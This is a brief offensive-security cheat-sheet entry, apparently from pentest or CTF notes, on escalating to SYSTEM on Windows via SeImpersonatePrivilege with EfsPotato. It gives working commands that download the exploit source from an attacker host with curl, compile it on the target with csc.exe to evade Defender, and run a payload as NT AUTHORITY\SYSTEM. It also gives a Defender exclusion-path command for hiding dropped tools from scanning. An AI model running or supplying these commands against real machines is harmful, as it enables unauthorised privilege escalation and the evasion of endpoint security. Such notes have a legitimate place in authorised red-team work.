# SeImpersonatePrivilege — EfsPotato

When Defender (or EDR) blocks the usual Potato binaries but `.NET` is available and you can write to disk, compile EfsPotato directly on the target using the built-in `csc.exe`:

```cmd
curl http://<LHOST>/EfsPotato.cs -o .\EfsPotato.cs
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /platform:x86 EfsPotato.cs -nowarn:1691,618
.\EfsPotato.exe "cmd.exe /C <payload>"
```

Triggers the EFS RPC coercion chain → `SYSTEM` token impersonation → runs the supplied command as `NT AUTHORITY\SYSTEM`.

**Defender exclusion path** — when `Set-MpPreference -DisableRealtimeMonitoring $true` is blocked, adding an exclusion path usually still works:
```powershell
Add-MpPreference -ExclusionPath C:\Users\<current-user>
```
Drop tools into that folder; Defender won't scan or delete from there.
